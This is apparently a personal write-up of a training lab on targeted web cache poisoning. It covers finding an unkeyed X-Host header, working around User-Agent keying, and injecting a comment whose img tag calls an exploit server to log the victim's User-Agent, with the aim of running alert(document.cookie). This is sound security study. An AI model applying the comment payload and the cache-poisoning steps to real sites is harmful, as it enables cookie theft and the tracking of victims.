*This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.*

Checked a blog post and saw the request in *Proxy:*
![[Screenshot 2024-06-04 at 5.11.10 PM.png]]
Same as the previous labs, it loads the `tracking.js` file from the given URL. 
Let's look for unkeyed inputs that we can potentially use to deliver the XSS via web cache poisoning. 
I found the following when using *Param Miner*:
![[Screenshot 2024-06-04 at 5.16.37 PM.png]]
![[Screenshot 2024-06-04 at 5.17.06 PM.png]]
The `X-Host` header is similiar to the `X-Forwarded-Host` header.
We can potentially modify the `X-Host` header to deliver our attack. 
I modified my exploit to the following:
![[Screenshot 2024-06-04 at 5.12.47 PM.png]]
From the initial request, it shows that under the `Vary` header, `User-Agent` is required. We need to find out the `User-Agent` of our victim.
This can be done by posting a comment that will redirect the victim to our exploit server with the following payload:
`<img src="https://exploit-0a04001d03be1465828d142d01b7000a.exploit-server.net/log"` (important to add the subdirectory)
This gives us the following `User-Agent` of the victim:
![[Screenshot 2024-06-04 at 5.27.19 PM.png]]
Pasted the above user-agent as a header to my modified request in the *Repeater*, adding in the `X-Host` header as well:
![[Screenshot 2024-06-04 at 5.56.21 PM.png]]
